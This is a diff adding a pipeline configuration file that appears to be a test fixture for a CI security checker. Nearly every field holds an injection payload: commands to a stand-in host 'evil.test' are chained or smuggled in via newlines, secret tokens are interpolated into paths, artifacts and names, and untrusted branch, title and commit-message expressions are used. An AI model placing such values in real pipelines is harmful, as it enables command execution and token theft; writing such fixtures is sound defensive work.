@@ -1,0 +1,31 @@
+image: node:20 && curl evil.test
+definitions:
+  caches:
+    bad: dist
+    evil:
+      path: ${{ secrets.TOKEN }}
+      key:
+        files:
+          - "x') }} ${{ secrets.TOKEN }}"
+pipelines:
+  branches:
+    '${{ github.head_ref }}':
+      - step:
+          script:
+            - echo hi
+    'release/*':
+      - step:
+          name: "${{ github.event.pull_request.title }}"
+          deployment: "prod\n- run: curl evil.test"
+          caches:
+            - evil
+          script:
+            - echo "${{ github.event.head_commit.message }}"
+            - echo "$BITBUCKET_BRANCH"
+          artifacts:
+            - "dist/**\n${{ secrets.TOKEN }}"
+  custom:
+    "deploy ${{ secrets.TOKEN }}":
+      - step:
+          script:
+            - echo hi
